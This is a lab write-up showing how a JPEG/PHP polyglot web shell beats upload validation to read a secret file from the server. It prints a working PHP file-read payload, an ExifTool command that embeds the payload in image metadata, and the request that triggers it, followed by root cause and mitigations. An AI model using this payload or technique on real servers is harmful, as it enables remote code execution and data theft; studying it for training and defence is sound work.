# Lab: Remote code execution via polyglot web shell upload

## Overview

This lab demonstrates a file upload vulnerability where the application validates uploaded files using content inspection but fails to detect polyglot files.

A polyglot file is a file that is simultaneously valid in multiple formats. By embedding PHP code inside a valid JPEG image, an attacker can bypass upload restrictions and achieve Remote Code Execution (RCE).

---

## Objective

Create a JPEG/PHP polyglot file, upload it to the application, and retrieve the secret stored on the server.

---

## Tools Used

- Burp Suite Community Edition
- Firefox Browser
- Kali Linux
- ExifTool
- JPEG Image
- PHP Web Shell

---

## Vulnerability Explanation

The application attempts to verify that uploaded files are genuine image files.

However, it does not properly inspect metadata fields inside uploaded images.

An attacker can embed PHP code inside a valid JPEG image's metadata, creating a polyglot file that:

- Passes image validation
- Remains a valid JPEG image
- Contains executable PHP code

When the server processes the file as PHP, the embedded code executes.

---

# PHP Payload Used

```php
<?php echo 'START' . file_get_contents('/home/carlos/secret') . 'END'; ?>
```

The markers `START` and `END` make it easier to locate the secret in the response.

---

# Steps to Reproduce

## 1. Open the Lab

Login to the application and navigate to the avatar upload functionality.

---

## 2. Create a Polyglot File

Choose any JPEG image.

Use ExifTool to inject PHP code into the image metadata:

```bash
exiftool -Comment="<?php echo 'START' . file_get_contents('/home/carlos/secret') . 'END'; ?>" image.jpg -o polyglot.php
```

The resulting file remains a valid JPEG image while containing executable PHP code.

### Screenshot

![Creating Polyglot File](using-exiftool-to-add-php-in-jpg-file.png)

---

## 3. Upload the Polyglot File

Upload:

```text
polyglot.php
```

The server accepts the file because it is still recognized as a valid image.

Response:

```text
The file avatars/polyglot.php has been uploaded.
```

---

## 4. Access the Uploaded File

Navigate to:

```http
GET /files/avatars/polyglot.php HTTP/2
```

The server executes the embedded PHP code.

---

## 5. Retrieve Secret

The response contains the image data along with the embedded output.

Search for:

```text
START
```

and

```text
END
```

The secret appears between these markers.

Example:

```text
STARTAC2JhlvbF9mchsSgGqBuM7cyx37xPUo1END
```

Secret:

```text
AC2JhlvbF9mchsSgGqBuM7cyx37xPUo1
```

### Screenshot

![Secret Retrieved](retriving-carlos-secret-code.png)

---

# Proof of Concept

## Embedded Payload

```php
<?php echo 'START' . file_get_contents('/home/carlos/secret') . 'END'; ?>
```

---

## ExifTool Command

```bash
exiftool -Comment="<?php echo 'START' . file_get_contents('/home/carlos/secret') . 'END'; ?>" image.jpg -o polyglot.php
```

---

## Access Request

```http
GET /files/avatars/polyglot.php HTTP/2
```

---

## Response Snippet

```text
STARTAC2JhlvbF9mchsSgGqBuM7cyx37xPUo1END
```

---

# Impact

- Remote Code Execution (RCE)
- Arbitrary file upload
- Web shell deployment
- Arbitrary file read
- Server compromise
- Potential privilege escalation

---

# Root Cause

The application validates uploaded files as images but does not properly inspect embedded metadata.

As a result:

- PHP code can be hidden inside image metadata
- Malicious files pass validation
- Polyglot files bypass security checks
- Arbitrary code execution becomes possible

---

# Mitigation

- Strip metadata from uploaded images
- Re-encode images server-side
- Validate file contents beyond MIME type checks
- Store uploads outside the web root
- Disable script execution in upload directories
- Use strict allowlists for accepted file types

---

# Key Learnings

- Learned how polyglot files bypass upload validation
- Understood metadata-based code injection
- Practiced creating polyglot files using ExifTool
- Learned how image uploads can lead to RCE
- Gained hands-on experience exploiting insecure file upload mechanisms
```**````
